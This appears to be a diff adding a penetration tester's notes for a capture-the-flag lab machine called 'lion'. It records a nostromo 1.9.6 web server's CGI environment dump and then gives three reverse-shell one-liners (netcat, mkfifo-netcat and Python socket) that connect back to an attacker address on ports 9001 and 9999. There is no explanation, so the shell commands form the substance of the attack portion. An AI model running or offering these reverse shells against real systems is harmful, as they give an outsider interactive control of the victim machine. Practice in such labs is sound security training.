@@ -1,0 +1,35 @@
+machine name is lion
+
+
+ip =10.10.209.70
+
+on 8080
+GATEWAY_INTERFACE=CGI/1.1
+REMOTE_ADDR=10.9.1.130
+DOCUMENT_ROOT=/var/nostromo/htdocs
+REMOTE_PORT=4760
+HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+SERVER_SIGNATURE=<address>nostromo 1.9.6 at 10.10.209.70 Port 8080</address>
+SCRIPT_FILENAME=/var/nostromo/htdocs/cgi-bin/printenv
+HTTP_HOST=10.10.209.70:8080
+REQUEST_URI=/cgi-bin/printenv
+SERVER_SOFTWARE=nostromo 1.9.6
+HTTP_CONNECTION=keep-alive
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+SERVER_PROTOCOL=HTTP/1.1
+HTTP_ACCEPT_ENCODING=gzip, deflate
+REQUEST_METHOD=GET
+SERVER_ADMIN=webmaster@nazgul.ch
+SERVER_ADDR=127.0.0.1
+PWD=/var/nostromo/htdocs/cgi-bin
+SERVER_PORT=8080
+SCRIPT_NAME=/cgi-bin/printenv
+SERVER_NAME=10.10.209.70:8080
+
+
+
+
+nc -e /bin/sh 10.9.1.130 9001
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.130 9001 >/tmp/f
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.130",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
